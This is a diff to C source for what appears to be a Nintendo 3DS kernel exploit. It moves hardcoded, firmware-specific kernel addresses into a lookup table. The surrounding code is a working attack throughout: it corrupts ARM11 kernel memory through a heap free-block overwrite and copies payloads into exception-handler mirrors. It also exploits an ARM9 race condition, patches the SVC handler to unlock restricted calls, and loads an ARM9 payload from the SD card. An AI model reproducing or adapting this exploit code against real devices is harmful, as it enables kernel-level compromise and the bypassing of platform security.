@@ -5,25 +5,16 @@
 #include <malloc.h>
 #include <dirent.h>
 #include "bootstrap.h"
+#include "sysdep.h"
 
 u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 
-u32 va_patch_createthread;
-u32 va_patch_svc_handler;
-u32 va_patch_hook1;
-u32 va_patch_hook2;
-u32 va_fcram_base;
-u32 va_exc_handler_base_W;
-u32 va_exc_handler_base_X;
-u32 va_kernelsetstate;
+struct exploit_data ed;
+struct arm11_shared_data arm11shared;
 
 u8 is_healed_svc_handler = 0;
-u32 kversion;
-u8 isN3DS = 0;
 u32 *backup;
-unsigned int *arm11_buffer;
-
-struct arm11_shared_data arm11shared;
+u32 *arm11_buffer;
 
 
 void redirect_codeflow(void *to, void *from)
@@ -89,6 +80,34 @@ u32 get_kernel_version()
 	return *(u32 *)VA_KERNEL_VERSION_REGISTER;
 }
 
+int get_exploit_data(struct exploit_data *data)
+{
+	u32 kversion = 0;    
+	u8  isN3DS = 0;
+	s32 i;
+	s32 result = 0;
+	u32 sysmodel = SYS_MODEL_NONE;
+	
+	if(!data)
+		return result;
+	
+	kversion = get_kernel_version();
+	APT_CheckNew3DS(NULL, &isN3DS);
+	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
+	
+	for(i=0; i<sizeof(supported_systems)/sizeof(supported_systems[0]); i++)
+	{
+		if (supported_systems[i].kernel_version == kversion &&
+			supported_systems[i].sys_model & sysmodel)
+			{
+				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
+				result = 1;
+				break;
+			}
+	}
+	return result;
+}
+
 /* Corrupts arm11 kernel code (CreateThread()) in order to
    open a door for arm11 code execution with kernel privileges.
 */
@@ -103,41 +122,18 @@ int corrupt_arm11_kernel_code(void)
 	// TODO ;-)
 	diff = heap0_get_diff();
 
-	kversion = get_kernel_version();    
-	
-	APT_CheckNew3DS(NULL, &isN3DS);
-	
-	if (isN3DS)
-	{
-		switch(kversion)
-		{
-			case 0x022E0000:
-				va_patch_createthread = 0xDFF83837;
-				va_patch_svc_handler = 0xDFF82260;
-				va_patch_hook1 = 0xDFFE7A50;
-				va_patch_hook2 = 0xDFFF4994;
-				
-				va_fcram_base = 0xE0000000;
-				va_exc_handler_base_W = 0xDFFF4000;
-				va_exc_handler_base_X = 0xFFFF0000;
-				va_kernelsetstate = 0xFFF158F8;
-	
-				arm11shared.va_hook1_ret = 0xFFF28A58;
-				arm11shared.va_pdn_regs = 0xFFFBE000;
-				arm11shared.va_pxi_regs = 0xFFFC0000;
-				break;
-				
-			default:
-				printf("Unsupported kernel version '%08X'\n", kversion);
-				return 0;				
-		}
+	if (!get_exploit_data(&ed)) {
+		printf("3DS model/firmware not yet supported.\n");
+		return 0;		
 	}
-	else
-	{
-		printf("Unsupported 3DS model\n");
-		return 0;
-	}
-	printf("Loaded adr %x for kernel %x\n", va_patch_createthread, kversion); 
+
+	arm11shared.va_hook1_ret = ed.va_hook1_ret;
+	arm11shared.va_pdn_regs = ed.va_pdn_regs;
+	arm11shared.va_pxi_regs = ed.va_pxi_regs;
+
+	printf("Loaded adr %x for kernel %x\n",
+		ed.va_patch_createthread,
+		ed.kernel_version); 
 
 	// part 1: corrupt kernel memory
 	u32 tmp_addr;
@@ -161,7 +157,7 @@ int corrupt_arm11_kernel_code(void)
 			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);			
 
 	arm11_buffer[0] = 1;
-	arm11_buffer[1] = va_patch_createthread - 8; // prev_free_blk at offs 8
+	arm11_buffer[1] = ed.va_patch_createthread - 8; // prev_free_blk at offs 8
 	arm11_buffer[2] = 0;
 	arm11_buffer[3] = 0;
 
@@ -259,7 +255,7 @@ int map_arm9_code(void)
 		src_end = sd_arm9_buf + sd_arm9_size;
 	}
 	
-	u32 *dst = (u32 *)(va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
+	u32 *dst = (u32 *)(ed.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
 	while (src != src_end) {
 		*dst = *src;
 		src++;
@@ -275,13 +271,13 @@ void exploit_arm9_race_condition()
 	extern u32 arm11_globals_start[];
 	extern u32 arm11_globals_end[];
 
-	int (* const _KernelSetState)(int, int, int, int) = (void *)va_kernelsetstate;
+	int (* const _KernelSetState)(int, int, int, int) = (void *)ed.va_kernelsetstate;
 	
 	asm volatile ("clrex");
 
 	/* copy arm11 payload to lower, writable mirror of
 	   mapped exception handlers*/
-	dst = (u32 *)(va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
+	dst = (u32 *)(ed.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
 	for (src = arm11_start; src != arm11_end;) {
 		*dst = *src;
 		dst++;
@@ -289,7 +285,7 @@ void exploit_arm9_race_condition()
 	}
 
 	/* copy firmware- and console specific data */
-	dst = (u32 *)(va_exc_handler_base_W + 
+	dst = (u32 *)(ed.va_exc_handler_base_W + 
 	              OFFS_EXC_HANDLER_UNUSED +
 	              ((arm11_end-arm11_start)<<2));
 	for (src = &arm11shared; src != &arm11shared + 
@@ -303,13 +299,13 @@ void exploit_arm9_race_condition()
 	map_arm9_code();
 
 	// patch arm11 kernel	 
-	redirect_codeflow(va_exc_handler_base_X +
+	redirect_codeflow(ed.va_exc_handler_base_X +
 	                  OFFS_EXC_HANDLER_UNUSED,
-					  va_patch_hook1);
+					  ed.va_patch_hook1);
 
 	redirect_codeflow(PA_EXC_HANDLER_BASE +
 	                  OFFS_EXC_HANDLER_UNUSED + 4,
-					  va_patch_hook2);
+					  ed.va_patch_hook2);
 	
 	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();
@@ -331,13 +327,13 @@ apply_patches (bool heal_svc_handler)
 	InvalidateEntireInstructionCache();	
 
 	// repair CreateThread()
-	*(int *)(va_patch_createthread) = 0x8DD00CE5;
+	*(int *)(ed.va_patch_createthread) = 0x8DD00CE5;
 			
 	// heal svc handler (patch it to allow access to restricted SVCs) 
-	if(heal_svc_handler && va_patch_svc_handler > 0)
+	if(heal_svc_handler && ed.va_patch_svc_handler > 0)
 	{
-		*(int *)(va_patch_svc_handler) = ARM_NOP;
-		*(int *)(va_patch_svc_handler+8) = ARM_NOP;
+		*(int *)(ed.va_patch_svc_handler) = ARM_NOP;
+		*(int *)(ed.va_patch_svc_handler+8) = ARM_NOP;
 		is_healed_svc_handler = 1;
 	}
 
@@ -377,18 +373,12 @@ int run_exploit()
 	nop_func();
 	printf("Exited nop slide\n");
 
-	arm11_buffer = linearMemAlign(0x10000, 0x10000);
+	arm11_buffer = linearMemAlign(0x10000, 0x1000);
 	if (arm11_buffer)
 	{
-		// wipe memory for debugging purposes
-		for (i = 0; i < 0x1000/sizeof(u32); i++)
-		{
-			arm11_buffer[i] = 0xdeadbeef;
-		}
-		
 		// if present in SD root, load arm9payload.bin 
 		if (load_arm9_binary("/arm9payload.bin"))
-			printf("Loaded arm9payload.bin from SD-Card\n");
+			printf("Loaded arm9payload.bin from SD-card\n");
 	
 		if(corrupt_arm11_kernel_code ())
 		{
